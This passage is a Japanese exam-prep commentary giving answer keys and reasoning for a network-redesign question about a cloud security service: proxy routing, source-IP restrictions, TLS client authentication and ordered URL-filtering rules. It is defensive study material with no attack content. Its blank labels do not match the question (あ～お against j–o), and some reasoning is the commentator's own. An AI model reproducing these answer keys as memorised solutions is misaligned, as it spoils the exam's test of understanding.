*   **CASB (Cloud Access Security Broker)**: クラウドサービスと利用者との間に位置し、通信を監視・制御することで、クラウド利用の可視化、セキュリティポリシー適用、データ保護などを実現するソリューションです。シャドーIT対策や機密データのクラウド利用管理に役立ちます。

### 設問3
[ネットワーク構成の見直し]に関する設問です。Pサービスの導入によるネットワーク構成とフィルタリングルールの設計を問います。

#### 設問3(1)
表4中の下線②について、見直し前と見直し後のアクセス方法の違いを、30字以内で答えよ。

> **正解**: プロキシサーバではなく,Pサービスを経由させる。

**解答に至るための思考プロセス**:
1.  表4の要件1「②営業所からインターネットへのアクセス方法を見直す。」とあります。
2.  図1（見直し前）のネットワーク構成を見ると、営業所のPCはL2SWを介してUTMを経由してインターネットにアクセスしています。UTMの機能としてプロキシ機能も考えられますが、問題文8ページに「PCのWebブラウザからインターネットへのアクセスは、本社のプロキシサーバを経由する。」とありますので、営業所PCからのインターネットアクセスも本社プロキシサーバを経由していると考えるのが自然です。
3.  図3（見直し後）のネットワーク構成を見ると、営業所のPCはL2SWを介して**Pコネクタ**を経由し、Pサービスに接続し、そこからインターネットへアクセスするようになっています。
4.  したがって、見直し前は本社プロキシサーバを経由していたが、見直し後はPサービスを経由するように変更された点が違いです。

**関連する重要な技術知識**:
*   **プロキシサーバ**: クライアントとインターネットの間に入り、Webアクセスを中継するサーバです。キャッシュ、URLフィルタリング、ログ取得などの機能があります。
*   **SASE (Secure Access Service Edge)**: ネットワークとセキュリティ機能をクラウドサービスとして統合し、どこからでも安全にアクセスできる環境を提供するアーキテクチャです。PサービスはSASEを実現するサービスの一つと解釈できます。

#### 設問3(2)
表4中の下線③について、Lサービスに追加する設定を、40字以内で答えよ。

> **正解**: 送信元制限機能で,営業所の UTM のグローバル IP アドレスを設定する。

**解答に至るための思考プロセス**:
1.  表4の要件1「Lサービスでの送信元制限機能は有効にしたまま、③営業所からLサービスにアクセスできるように設定を追加する。」とあります。
2.  設問1(2)の解説で確認した通り、Lサービスの送信元制限機能は「本社のUTMのグローバルIPアドレス」からのアクセスのみを許可していました。
3.  営業所からもアクセスできるようにするためには、この送信元制限機能に「営業所のUTMのグローバルIPアドレス」を追加する必要があります。

#### 設問3(3)
表4中の下線④について、選択する方式を、表1中の(ア), (イ)から選び、記号で答えよ。

> **正解**: (イ)

**解答に至るための思考プロセス**:
1.  表4の要件2「多要素認証を有効にして、④方式を選択する。」とあります。
2.  表1の「Lサービス」の「多要素認証機能」を見ると、選択肢として(ア)「スマートフォンにSMSでワンタイムパスワードを送り、それを入力させる方式」と(イ)「TLSクライアント認証を行う方式」があります。
3.  要件5に「SaaS-aへのアクセスは業務で必要な**最小限の利用者に限定する**」とあります。また、SaaS-aは「研究開発部の従業員が使用する」と注記されています。
4.  SMS認証は比較的容易に導入できますが、利用者全員がスマートフォンを持つ必要があるなど、対象の限定には適していません。一方、TLSクライアント認証は、証明書の発行や管理が必要であり、特定の利用者グループ（研究開発部の従業員）に限定して利用を許可するのに適しています。
5.  「最小限の利用者に限定する」という要件を考慮すると、**TLSクライアント認証 (イ)**の方がより厳密なアクセス制御と利用者限定に適していると判断できます。

#### 設問3(4)
表4中の`h`,`i`に入れる適切な数字を答えよ。

> **正解**:
> `h`: 6
> `i`: 2

**解答に至るための思考プロセス**:
1.  表4の要件3「表3の項番`h`の機能を使う。」とあります。要件3は「R-PCから本社のサーバにアクセスできるようにする。ただし、UTMのファイアウォール機能には、インターネットからの通信を許可するルールを追加しない。」です。
2.  表3を見ると、項番6「リモートアクセス機能」が「Pコネクタを社内に導入することによって、社内と社外の境界にあるファイアウォールの設定を変更せずに社外から社内にアクセスできる。」とあります。これは要件3と合致するため、`h`は6です。
3.  表4の要件4「表3の項番`i`の機能を使う。」とあります。要件4は「HTTPS通信の内容をマルウェアスキャンする。」です。
4.  表3を見ると、項番2「マルウェアスキャン機能」が「送信元からのTLS通信を終端し、復号してマルウェアスキャンを行う。」とあります。これは要件4と合致するため、`i`は2です。

#### 設問3(5)
表5中の`あ`～`お`に入れる適切な数字、字句を答えよ。

> **正解**:
> `あ`: 4
> `い`: 3
> `j`: https://△△△-a.jp/
> `k`: 研究開発部の従業員
> `l`: 許可
> `m`: 外部ストレージサービス
> `n`: 全て
> `o`: 禁止

**解答に至るための思考プロセス**:
1.  表5は要件5「SaaS-a以外の外部ストレージサービスへのアクセスは禁止とする。また、SaaS-aへのアクセスは業務で必要な最小限の利用者に限定する。」に対する設定です。
2.  「番号の小さい順に最初に一致したルールが適用される。」という重要な注意点があります。
3.  まず、SaaS-aへのアクセスを限定的に許可するルールを優先的に適用する必要があります。SaaS-aはURL単位で特定できるため、表3の項番4「URL単位フィルタリング機能」を使います。
    *   番号1:
        *   表3の項番: `あ` = 4
        *   URLカテゴリ又はURL: `j` = `https://△△△-a.jp/` (SaaS-aのURL)
        *   利用者ID: `k` = `研究開発部の従業員` (SaaS-a利用者に限定)
        *   アクション: `l` = `許可`
4.  次に、「SaaS-a以外の外部ストレージサービスへのアクセスは禁止」するルールを設定します。これはURLカテゴリ単位で設定するのが効率的です。表3の項番3「URLカテゴリ単位フィルタリング機能」を使います。
    *   番号2:
        *   表3の項番: `い` = 3
        *   URLカテゴリ又はURL: `m` = `外部ストレージサービス`
        *   利用者ID: `n` = `全て` (SaaS-a利用者を除く全従業員が対象)
        *   アクション: `o` = `禁止`
5.  この順序でルールを適用することで、まずSaaS-a（外部ストレージサービスの一種）へのアクセスが研究開発部員に限り許可され、次にそれ以外の外部ストレージサービスへのアクセスが全ての利用者に対して禁止されます。

**関連する重要な技術知識**:
*   **URLフィルタリング**: 特定のURLやURLカテゴリへのアクセスを制限する機能です。セキュリティポリシーの適用、生産性向上、マルウェア感染防止などに利用されます。
*   **ルール適用順序**: フィルタリングやファイアウォールなどのセキュリティ製品では、設定されたルールが上から順に評価され、最初に一致したルールが適用されることが一般的です。この順序を誤ると、意図しないアクセスが許可されたり、必要なアクセスが拒否されたりする可能性があります。

## 採点講評からのアドバイス
*   **通信経路の正確な理解**: クラウドサービス導入に伴うネットワーク構成の見直しでは、見直し前と見直し後の通信経路がどのように変化するかを正確に理解することが不可欠です。ネットワーク図を丁寧に読み解き、各要素の役割と連携を把握する訓練をしましょう。
*   **フィルタリングルールの設計と順序**: セキュリティ製品におけるフィルタリングルールは、適用される順序によって動作が大きく変わるため、その優先順位を考慮した設計が非常に重要です。特定のアクセスを許可しつつ、それ以外を禁止するといった複雑な要件の場合、ルールの並び方に細心の注意を払いましょう。

## 関連する学習テーマ
*   **クラウドセキュリティ**: SaaS、PaaS、IaaSのセキュリティ特性、IDaaS、CASB、SASEといったクラウドセキュリティソリューション。
*   **ネットワーク設計**: DMZ、FW、UTM、プロキシ、VPNなどのネットワークコンポーネントの役割と配置、セグメンテーション。
*   **認証・認可技術**: SAML、OAuth/OpenID Connect、多要素認証（MFA）、TLSクライアント認証。
*   **リモートアクセスセキュリティ**: VPN、ゼロトラストネットワークアクセス(ZTNA)。
*   **セキュリティポリシー**: 組織のセキュリティ要件を具体的な技術設定に落とし込む方法。
*   **情報セキュリティマネジメント**: リスクアセスメント、脅威分析、脆弱性管理。

---